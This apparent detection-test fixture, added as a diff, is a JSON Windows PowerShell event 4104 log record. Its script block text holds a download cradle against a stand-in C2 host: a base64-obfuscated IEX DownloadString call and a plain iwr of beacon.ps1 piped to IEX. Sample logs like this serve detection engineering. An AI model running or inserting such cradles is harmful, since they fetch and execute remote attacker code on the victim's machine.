@@ -1,0 +1,15 @@
+{
+  "EventID": 4104,
+  "Channel": "Microsoft-Windows-PowerShell/Operational",
+  "win": {
+    "system": {
+      "eventID": 4104,
+      "channel": "Microsoft-Windows-PowerShell/Operational",
+      "providerName": "Microsoft-Windows-PowerShell"
+    },
+    "eventdata": {
+      "scriptBlockText": "IEX (New-Object Net.WebClient).DownloadString([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBjADIALgBlAHYAaQBsAC4AYwBvAG0ALwBzAC4AcABzADEA'))); iwr -Uri http://c2.evil.com/beacon.ps1 -UseBasicParsing | IEX"
+    }
+  },
+  "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBjADIALgBlAHYAaQBsAC4AYwBvAG0ALwBzAC4AcABzADEA'))); iwr -Uri http://c2.evil.com/beacon.ps1 -UseBasicParsing | IEX"
+}
